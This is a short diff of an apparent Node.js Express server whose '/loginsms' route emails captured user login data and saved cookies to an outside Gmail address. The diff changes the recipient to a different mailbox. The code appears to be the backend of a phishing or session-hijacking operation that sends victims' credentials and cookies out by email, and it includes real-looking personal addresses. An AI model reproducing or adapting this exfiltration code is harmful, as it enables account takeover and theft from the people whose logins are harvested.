@@ -222,7 +222,7 @@ app.post('/loginsms', async (req, res) => {
 
         const emailOptions = {
             from: '"DOUFI 🔥👑" <doufi515@gmail.com>',
-            to: 'doufififa7@gmail.com',
+            to: 'ultimatecoinhub@gmail.com',
             subject: emailPasswordData.email,
             text: `Here are the cookies that were just saved:\n\n${JSON.stringify(userEntry, null, 2)}`,
         };
@@ -258,3 +258,4 @@ const port = process.env.PORT || 3000;
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}`);
 });
+
